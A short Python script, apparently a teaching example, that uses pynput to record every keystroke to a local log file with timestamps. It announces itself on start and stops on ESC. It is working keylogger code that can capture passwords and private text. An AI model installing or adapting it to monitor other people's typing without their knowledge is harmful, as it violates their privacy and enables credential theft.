from pynput import keyboard
import time
import os

# File to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    """Function that runs when a key is pressed"""
    try:
        # For normal characters
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # For special keys like space, enter, etc.
        with open(log_file, "a") as f:
            # Format special keys nicely
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                # This is simplified - in a real logger you might want to 
                # actually remove the last character
                f.write("[BACKSPACE]")
            else:
                f.write(f"[{str(key)}]")

def on_release(key):
    """Function that runs when a key is released"""
    # Stop the listener if escape is pressed
    if key == keyboard.Key.esc:
        # Log the time when the logger was stopped
        with open(log_file, "a") as f:
            f.write(f"\n\n[Logging stopped at {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
        return False

# Create or clear the log file
with open(log_file, "w") as f:
    f.write(f"[Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')}]\n\n")

# Start listening for keystrokes
print(f"Keylogger started. Saving to {os.path.abspath(log_file)}")
print("Press ESC to stop logging.")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"Keylogger stopped. Log saved to {os.path.abspath(log_file)}")